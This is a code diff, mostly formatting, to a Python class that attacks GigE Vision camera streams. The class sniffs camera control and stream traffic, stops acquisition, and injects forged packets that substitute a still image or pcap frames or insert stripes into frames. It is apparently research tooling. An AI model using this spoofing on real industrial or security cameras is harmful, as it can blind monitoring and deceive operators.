@@ -24,6 +24,7 @@ import random
 
 from gige.constansts import *
 from gige.gige_constants import *
+from gige.gige_constants import Layers
 from gige.utils import bgr_img_to_packets_payload
 from utils.injection import get_stripe, insert_stripe_to_img
 from utils.detection_utils import Rectangle
@@ -145,7 +146,7 @@ class GigELink:
         img_width: int = img_width,
         img_height: int = img_height,
         max_payload_bytes: int = max_payload_bytes,
-        logger: Optional[logging.Logger] = None
+        logger: Optional[logging.Logger] = None,
     ):
         self.interface = interface
         self.cp_ip = cp_ip
@@ -240,7 +241,9 @@ class GigELink:
                 if pkt[Layers.UDP.value].sport not in gvcp_excluded_ports:
                     gvcp_src_port = pkt[Layers.UDP.value].sport
                     self.set_gvcp_src_port(gvcp_src_port)
-                    self.log(f"Found GVCP port {gvcp_src_port}", log_level=logging.DEBUG)
+                    self.log(
+                        f"Found GVCP port {gvcp_src_port}", log_level=logging.DEBUG
+                    )
 
         def stop_filter(pkt):
             return self.gvsp_dst_port != -1 and self.gvcp_src_port != -1
@@ -274,10 +277,13 @@ class GigELink:
             and pkt[Layers.IP.value].src == self.camera_ip
         ):
             self.last_block_id = pkt[Layers.GVSP.value].BlockID
-            self.log(f"Found GVSP packet for block {pkt[Layers.GVSP.value].BlockID} and packet {pkt[Layers.GVSP.value].PacketID}", log_level=logging.DEBUG)
+            self.log(
+                f"Found GVSP packet for block {pkt[Layers.GVSP.value].BlockID} and packet {pkt[Layers.GVSP.value].PacketID}",
+                log_level=logging.DEBUG,
+            )
             return True
         return False
-    
+
     def send_gvsp_pcap(self, gvsp_pcap_path: Path, fps: float = 1) -> None:
         self.log("Reading PCAP file")
         gvsp_packets = rdpcap(gvsp_pcap_path.as_posix())
@@ -309,8 +315,8 @@ class GigELink:
                 frame_packets = [packet]
                 current_frame_id = packet.BlockID
                 offset += 1
-    
-        frame_duration = 1/fps
+
+        frame_duration = 1 / fps
         self.log(f"Sending pcap frames at rate {fps}", log_level=logging.DEBUG)
         for frame in frames:
             start_time = time.time()
@@ -321,7 +327,10 @@ class GigELink:
     def stop_and_replace_with_pcap(self, frame_pcap_path, timeout=2):
         self.log("Stopping acquisition", log_level=logging.DEBUG)
         self.send_stop_command(count=1)
-        self.log(f"Sniffing until TRAILER is sent, timeout {timeout} seconds", log_level=logging.DEBUG)
+        self.log(
+            f"Sniffing until TRAILER is sent, timeout {timeout} seconds",
+            log_level=logging.DEBUG,
+        )
         sniff(
             iface=self.interface,
             filter="udp",
@@ -342,7 +351,10 @@ class GigELink:
     def stop_and_replace_with_image(self, img_path, timeout=2):
         self.log("Stopping acquisition", log_level=logging.DEBUG)
         self.send_stop_command(count=1)
-        self.log(f"Sniffing until TRAILER is sent, timeout {timeout} seconds", log_level=logging.DEBUG)
+        self.log(
+            f"Sniffing until TRAILER is sent, timeout {timeout} seconds",
+            log_level=logging.DEBUG,
+        )
         sniff(
             iface=self.interface,
             filter="udp",
@@ -436,7 +448,9 @@ class GigELink:
 
         return gvsp_packets
 
-    def sniff_block_id(self, stop_filter: Optional[Callable[[Packet], bool]]=None) -> None:
+    def sniff_block_id(
+        self, stop_filter: Optional[Callable[[Packet], bool]] = None
+    ) -> None:
         self.log("Sniffing for blockID", log_level=logging.DEBUG)
         if stop_filter is None:
             stop_filter = self.callback_update_block_id
@@ -448,7 +462,9 @@ class GigELink:
             store=0,
             timeout=1,
         )
-        self.log(f"Last Sniffed BLockID = {self.last_block_id}", log_level=logging.DEBUG)
+        self.log(
+            f"Last Sniffed BLockID = {self.last_block_id}", log_level=logging.DEBUG
+        )
 
     def inject_gvsp_packets(
         self, gvsp_packets: PacketList, block_id: int, count: int = 100
@@ -527,7 +543,10 @@ class GigELink:
         )
         num_injections = int(np.ceil(fps * injection_duration))
         if num_injections == 0:
-            self.log("NO INJECTIONS: duration less than injection time", log_level=logging.WARNING)
+            self.log(
+                "NO INJECTIONS: duration less than injection time",
+                log_level=logging.WARNING,
+            )
             return
 
         frame_duration = 1 / fps
@@ -537,19 +556,24 @@ class GigELink:
         time.sleep(waiting_time)
         self.log(
             f"Attempting stripe injection for frames {first_injected_id} - {first_injected_id + num_injections - 1}",
-              log_level=logging.DEBUG)
+            log_level=logging.DEBUG,
+        )
         for injection_ind in range(num_injections):
             start_time = time.time()
-            self.log(f"Injecting stripe to {first_injected_id + injection_ind}", log_level=logging.DEBUG)
+            self.log(
+                f"Injecting stripe to {first_injected_id + injection_ind}",
+                log_level=logging.DEBUG,
+            )
             self.inject_gvsp_packets(
                 stripe_packets, block_id=first_injected_id + injection_ind, count=count
             )
             end_time = time.time()
-            self.log(f"Insertion took {end_time - start_time} seconds", log_level=logging.DEBUG)
+            self.log(
+                f"Insertion took {end_time - start_time} seconds",
+                log_level=logging.DEBUG,
+            )
             time.sleep(max(0, waiting_time - (end_time - start_time)))
-        self.log(
-            f"Stripe Attack Finished", log_level=logging.DEBUG
-        )
+        self.log(f"Stripe Attack Finished", log_level=logging.DEBUG)
 
     def fake_still_image(
         self,
@@ -562,9 +586,15 @@ class GigELink:
         timeout = 1  # seconds
         self.sniff_block_id()
         self.log("BlockID found", log_level=logging.DEBUG)
-        self.log(f"Stopping acquisition for {duration} seconds with still image", log_level=logging.DEBUG)
+        self.log(
+            f"Stopping acquisition for {duration} seconds with still image",
+            log_level=logging.DEBUG,
+        )
         self.send_stop_command(count=1)
-        self.log(f"Sniffing until TRAILER is sent, timeout {timeout} seconds", log_level=logging.DEBUG)
+        self.log(
+            f"Sniffing until TRAILER is sent, timeout {timeout} seconds",
+            log_level=logging.DEBUG,
+        )
         sniff(
             iface=self.interface,
             filter="udp",
@@ -585,23 +615,33 @@ class GigELink:
             for pkt in gvsp_fake_packets:
                 pkt[Layers.GVSP.value].BlockID = self.last_block_id + 1
             if self.last_timestamp_block_id is not None:
-                time_elapsed_of_last_recorded_timestamp = (self.last_block_id + 1 - self.last_timestamp_block_id) *1/fps
-                gvsp_fake_packets[0][Layers.GVSP_LEADER.value].Timestamp = int(self.last_timestamp + time_elapsed_of_last_recorded_timestamp * 1_000_000_000)
+                time_elapsed_of_last_recorded_timestamp = (
+                    (self.last_block_id + 1 - self.last_timestamp_block_id) * 1 / fps
+                )
+                gvsp_fake_packets[0][Layers.GVSP_LEADER.value].Timestamp = int(
+                    self.last_timestamp
+                    + time_elapsed_of_last_recorded_timestamp * 1_000_000_000
+                )
             sendp(gvsp_fake_packets, iface=self.interface, verbose=False)
             self.last_block_id += 1
             iteration_ended = time.time()
             iteration_duration = iteration_ended - itertation_started
             iterations_time.append(iteration_duration)
-            time.sleep(max(0, 1/fps - iteration_duration))
+            time.sleep(max(0, 1 / fps - iteration_duration))
 
         injection_finished = time.time()
         self.log("Full Frame Injection Ended", log_level=logging.DEBUG)
-        self.log(f"Injected for {injection_finished-injection_started} seconds",  log_level=logging.DEBUG)
-        self.log(f"average iteration time = {np.average(np.array(iterations_time))}", log_level=logging.DEBUG)
+        self.log(
+            f"Injected for {injection_finished-injection_started} seconds",
+            log_level=logging.DEBUG,
+        )
+        self.log(
+            f"average iteration time = {np.average(np.array(iterations_time))}",
+            log_level=logging.DEBUG,
+        )
 
         self.log("Restarting acquisition", log_level=logging.DEBUG)
         self.send_start_command(count=1)
-
 
     def log(self, msg, log_level=logging.INFO):
         if self.logger is None:
@@ -619,6 +659,7 @@ class GigELink:
             self.logger.critical(msg)
         else:
             raise ValueError(f"Invalid log level: {log_level}")
+
 
 def parse_args():
     parser = argparse.ArgumentParser()
